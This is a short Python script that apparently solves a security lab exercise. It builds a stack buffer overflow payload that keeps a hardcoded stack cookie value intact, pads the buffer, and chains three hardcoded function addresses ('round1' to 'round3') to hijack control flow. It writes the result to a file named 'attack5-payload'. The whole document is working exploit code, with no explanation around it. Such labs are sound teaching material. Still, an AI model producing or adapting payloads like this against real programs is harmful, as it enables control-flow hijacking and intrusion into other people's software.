import struct
import sys

# Value of the stack_cookie
stack_cookie = 0xDEAD2BAD
# Packing the stack_cookie value
stack_cookie_packed = struct.pack('<I',stack_cookie)

# Address of the round1 function
round1_address = 0x5655626d
# Packing the round_1 function address
round1_address_packed = struct.pack('<I',round1_address)

# Address of the round2 function
round2_address = 0x56556307
# Packing the round_2 function address
round2_address_packed = struct.pack('<I',round2_address)

# Address of the round3 function
round3_address = 0x565563a1
# Packing the round_3 function address
round3_address_packed = struct.pack('<I',round3_address)

#----------------------------
# Creating the payload
#----------------------------
# Adding padding to the payload
payload = b'A'*302
# Adding the value of the stack cookie to the payload
payload += stack_cookie_packed
# Adding padding to the payload
payload += b'A'* 12
# Writing the addresses of round_1,round_2,round_3 function to the payload one after the other to the payload
payload += round1_address_packed
payload += round2_address_packed
payload += round3_address_packed

# Write into the attack5-payload file
with open("attack5-payload", "wb") as f:
    f.write(payload)


